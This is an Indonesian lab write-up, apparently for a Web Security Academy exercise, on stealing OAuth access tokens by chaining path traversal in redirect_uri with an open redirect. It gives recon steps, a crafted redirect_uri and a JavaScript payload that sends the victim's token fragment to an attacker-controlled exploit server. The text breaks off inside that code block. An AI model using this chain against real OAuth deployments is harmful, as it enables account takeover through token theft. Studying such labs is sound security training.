# Catatan Lab: Stealing OAuth Access Tokens via an Open Redirect

## Mengenal Celah Keamanan
Celah keamanan ini merupakan bentuk eksploitasi berantai (*vulnerability chaining*) yang memanfaatkan fitur **Open Redirect** pada aplikasi utama untuk mem-bypass sistem keamanan daftar putih (*whitelist*) URL pada server OAuth.

1. **Eksploitasi Rantai redirect_uri:** Server OAuth telah mengunci validasi domain dasar pada parameter `redirect_uri` (misalnya hanya membolehkan path `/oauth-callback`). Namun, penyerang memanfaatkan teknik *directory traversal* (`/oauth-callback/../`) digabungkan dengan fitur internal aplikasi yang memiliki celah *Open Redirect* (fitur pengalihan URL yang tidak divalidasi).
2. **Kebocoran Token via URL Fragment:** Karena jenis respons alur OAuth yang digunakan adalah *Implicit Grant* (`response_type=token`), server OAuth akan menempelkan token rahasia di bagian belakang URL menggunakan tanda pagar atau fragmen (`#access_token=...`). Saat celah *Open Redirect* terpicu, browser korban secara otomatis membawa fragmen tersebut ke domain luar milik penyerang tanpa mengubah isi datanya.

---

## Tahapan Eksploitasi

1. **Berburu Celah Open Redirect (Recon):**  
   Telusuri fungsionalitas web utama target untuk menemukan parameter pengalihan halaman, misalnya fitur *"Next/Back"* setelah membaca artikel, pengalihan setelah berpindah bahasa, atau tautan keluar. Pastikan parameter tersebut mau mengalihkan browser ke domain luar (seperti domain *exploit server* lu) tanpa ada pemblokiran.

2. **Memetakan Request OAuth:**  
   Picu alur login pihak ketiga (OAuth) dan tangkap request-nya menggunakan Burp Suite. Identifikasi endpoint otorisasi beserta parameter wajib seperti `client_id`, `response_type=token`, dan `redirect_uri`.

3. **Menyusun Payload Pengalihan Berantai:**  
   Manipulasi nilai parameter `redirect_uri` pada request OAuth asli dengan menggabungkan trik *path traversal* dan *open redirect* yang sudah ditemukan pada langkah pertama. Struktur kasarnya akan terlihat seperti ini:
   `https://[WEB_UTAMA]/oauth-callback/../[PATH_OPEN_REDIRECT]?path=https://[DOMAIN_EXPLOIT]`

4. **Konfigurasi Conditional Script pada Exploit Server:**  
   Masuk ke panel *exploit server* lab. Pada bagian **Body**, pasang skrip JavaScript kondisional. Skrip ini memiliki dua peran logika: mengarahkan korban ke server OAuth pada kunjungan pertama, dan merekam token ke log ketika korban terlempar kembali ke server kita membawa fragmen URL.

   ```html
   <script>
     if (!document.location.hash) {
       // Kondisi 1: Browser korban pertama kali datang, lempar ke server OAuth dengan URL manipulasi
       window.location = 'https://oauth-[ID_LAB].oauth-server.net/auth?client_id=[CLIENT_ID]&redirect_uri=https://[ID_LAB].web-security-academy.net/oauth-callback/../[HALAMAN_OPEN_REDIRECT]=[DOMAIN_EXPLOIT]&response_type=token&nonce=-1130653934&scope=openid%20profile%20email';
     } else {
       // Kondisi 2: Korban kembali dari OAuth membawa token di fragmen URL (#), kirim datanya ke log
       fetch('/?kunci_akses=' + encodeURIComponent(document.location.hash));
     }
   </script>
